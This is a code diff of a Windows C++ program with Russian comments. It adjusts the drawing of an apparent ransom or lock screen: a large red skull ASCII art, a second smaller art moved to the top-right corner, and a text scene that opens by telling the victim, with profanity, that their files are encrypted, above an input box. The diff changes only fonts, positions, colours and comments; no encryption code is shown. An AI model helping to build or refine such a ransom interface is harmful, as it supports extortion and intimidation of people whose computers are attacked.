@@ -2,7 +2,7 @@
 #include <windows.h>
 #include <string>
 
-// === ТВОЙ ГЛАВНЫЙ АРТ (на весь экран) ===
+// === ТВОЙ ОСНОВНОЙ АРТ (тот, что с черепом) ===
 static const wchar_t* kArt[] = {
     L"@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@*--=+*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
     L"@@@@@@@@@@%%---=*#%%%%@@@@@@@@@@#=+@%%+-=*%@@@@@@@@@@@@@@@@@@@@@@%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
@@ -143,7 +143,6 @@ L"                                                           .:+%@@@@@@@@%%%####
 };
 static constexpr int kArtTopLines = sizeof(kArtTop) / sizeof(kArtTop[0]);
 
-
 // === ТЕКСТ ===
 static const wchar_t* kNote[] = {
     L"Твои файлы зашифрованы к хуям собачьим.",
@@ -178,8 +177,8 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         if (g_showNote == 0) {
             // --- СЦЕНА 1: АРТ ---
             
-            // 1. Рисуем ГЛАВНЫЙ арт по центру
-            int art_fs = cy / (kArtLines + 4); 
+            // 1. Основной арт (по центру, но чуть уменьшен)
+            int art_fs = cy / (kArtLines + 10); // Немного уменьшили
             HFONT f_art = CreateFontW(-art_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                 DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                 ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
@@ -189,7 +188,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             int lh = tm.tmHeight + 1;
             int art_y = (cy - (kArtLines * lh)) / 2;
 
-            SetTextColor(dc, RGB(160, 20, 20)); // Темно-красный
+            SetTextColor(dc, RGB(160, 20, 20));
             for (int i = 0; i < kArtLines; ++i) {
                 SIZE s{}; GetTextExtentPoint32W(dc, kArt[i], (int)wcslen(kArt[i]), &s);
                 int x = (cx - s.cx) / 2; if (x < 0) x = 0;
@@ -197,21 +196,31 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
                 art_y += lh;
             }
 
-            // 2. Рисуем НОВЫЙ арт в ЛЕВОМ ВЕРХНЕМ углу (поверх)
-            // Делаем шрифт для него поменьше, чтобы он не перекрывал всё
-            int top_art_fs = art_fs / 1.8; 
-            HFONT f_top = CreateFontW(-top_art_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
+            // 2. Верхний арт (маленький, в правом верхнем углу)
+            int top_fs = art_fs / 2.5; // Уменьшили в 2.5 раза
+            HFONT f_top = CreateFontW(-top_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                 DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                 ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
             SelectObject(dc, f_top);
             
             GetTextMetricsW(dc, &tm);
             int top_lh = tm.tmHeight + 1;
-            int top_y = 10; // Отступ от верхнего края
+            
+            // Считаем ширину верхнего арта, чтобы прижать его вправо
+            int max_w = 0;
+            for(int i=0; i<kArtTopLines; ++i) {
+                SIZE s{}; GetTextExtentPoint32W(dc, kArtTop[i], (int)wcslen(kArtTop[i]), &s);
+                if(s.cx > max_w) max_w = s.cx;
+            }
+            
+            // Рисуем в правом верхнем углу с отступом 20 пикселей
+            int top_x = cx - max_w - 20; 
+            if (top_x < 0) top_x = 0;
+            int top_y = 20; 
 
-            SetTextColor(dc, RGB(200, 50, 50)); // Чуть светлее для контраста
+            SetTextColor(dc, RGB(220, 40, 40)); // Чуть ярче основного
             for (int i = 0; i < kArtTopLines; ++i) {
-                TextOutW(dc, 10, top_y, kArtTop[i], (int)wcslen(kArtTop[i]));
+                TextOutW(dc, top_x, top_y, kArtTop[i], (int)wcslen(kArtTop[i]));
                 top_y += top_lh;
             }
             
@@ -221,6 +230,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             
         } else {
             // --- СЦЕНА 2: ТЕКСТ ---
+            // (Остается без изменений)
             int note_fs = cy / 45; 
             HFONT f_note = CreateFontW(-note_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                 DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
@@ -233,7 +243,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             int total_h = kNoteLines * note_lh;
             int text_y = (cy - total_h) / 2;
 
-            SetTextColor(dc, RGB(255, 20, 147)); // Ярко-розовый
+            SetTextColor(dc, RGB(255, 20, 147)); 
             for (int i = 0; i < kNoteLines; ++i) {
                 SIZE s{}; GetTextExtentPoint32W(dc, kNote[i], (int)wcslen(kNote[i]), &s);
                 int text_x = (cx - s.cx) / 2; 
@@ -242,7 +252,6 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
                 text_y += note_lh;
             }
 
-            // Поле ввода
             int box_w = cx / 2;
             int box_h = note_lh + 10;
             int box_x = (cx - box_w) / 2;
